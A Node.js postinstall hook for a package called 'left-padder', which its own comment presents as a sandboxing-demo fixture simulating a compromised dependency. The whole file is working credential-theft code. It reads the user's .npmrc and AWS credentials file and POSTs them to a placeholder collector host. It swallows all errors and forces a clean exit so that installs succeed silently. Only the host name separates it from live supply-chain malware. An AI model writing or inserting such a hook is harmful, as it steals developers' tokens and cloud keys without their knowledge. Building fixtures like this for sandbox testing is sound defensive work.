'use strict';

/**
 * left-padder postinstall hook.
 *
 * This is a test fixture for a sandboxing demo. It simulates the behaviour of a
 * compromised dependency: it harvests local credential files and exfiltrates
 * them to a collector endpoint. It only ever runs inside an isolated test VM
 * that holds fake canary credentials and blocks all network traffic.
 *
 * Requirements for this fixture:
 *   - Node built-ins only (no shell commands, no third-party dependencies).
 *   - Must never throw and must never exit non-zero, so that `npm install`
 *     still succeeds even though the network is blocked.
 *   - Uses a 5 second timeout on the outbound request.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const COLLECTOR_HOST = 'collector.airlock-demo.invalid';
const COLLECTOR_PATH = '/upload';
const TIMEOUT_MS = 5000;

/** Candidate files to read. Missing files are simply skipped. */
const TARGET_FILES = [
  path.join(os.homedir(), '.npmrc'),
  path.join(os.homedir(), '.aws', 'credentials'),
];

/**
 * Read a file, returning its contents as a string, or null on any failure.
 * Every possible error path is swallowed.
 */
function readFileOrNull(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (_err) {
    // File missing, unreadable, or anything else: not our problem.
    return null;
  }
}

/**
 * Collect the contents of the target files that exist.
 * Returns an object mapping file path -> file contents.
 */
function collectFiles() {
  const collected = {};

  for (const filePath of TARGET_FILES) {
    const contents = readFileOrNull(filePath);
    if (contents !== null) {
      collected[filePath] = contents;
    }
  }

  return collected;
}

/**
 * POST the collected data to the collector as JSON.
 * Resolves when the request has been sent/finished; never rejects.
 */
function upload(payload) {
  return new Promise((resolve) => {
    let body;
    try {
      body = JSON.stringify(payload);
    } catch (_err) {
      resolve();
      return;
    }

    let settled = false;
    const done = () => {
      if (!settled) {
        settled = true;
        resolve();
      }
    };

    let req;
    try {
      req = https.request(
        {
          hostname: COLLECTOR_HOST,
          port: 443,
          path: COLLECTOR_PATH,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
          },
          timeout: TIMEOUT_MS,
        },
        (res) => {
          // Drain the response so the process can finish cleanly.
          res.on('data', () => {});
          res.on('end', done);
          res.on('error', done);
        }
      );
    } catch (_err) {
      done();
      return;
    }

    // Hard stop after TIMEOUT_MS no matter what.
    const timer = setTimeout(() => {
      try {
        req.destroy();
      } catch (_err) {
        /* ignore */
      }
      done();
    }, TIMEOUT_MS);

    req.on('timeout', () => {
      try {
        req.destroy();
      } catch (_err) {
        /* ignore */
      }
    });

    req.on('error', () => {
      clearTimeout(timer);
      done();
    });

    req.on('close', () => {
      clearTimeout(timer);
      done();
    });

    try {
      req.end(body);
    } catch (_err) {
      clearTimeout(timer);
      done();
    }
  });
}

/**
 * Entry point. Never throws, never exits non-zero.
 */
function main() {
  return Promise.resolve()
    .then(() => collectFiles())
    .then((payload) => upload(payload))
    .catch(() => {})
    .then(() => {});
}

// Run only when executed directly (`node postinstall.js`), not when required.
if (require.main === module) {
  const result = main();

  // Keep the process alive until the request settles, but never let an
  // unhandled rejection or unexpected error fail the install.
  process.on('uncaughtException', () => {});
  process.on('unhandledRejection', () => {});

  result.then(() => {
    // Give in-flight sockets a moment to close, then exit successfully.
    setTimeout(() => process.exit(0), 50).unref();
  });
}

module.exports = { collectFiles, upload, main };
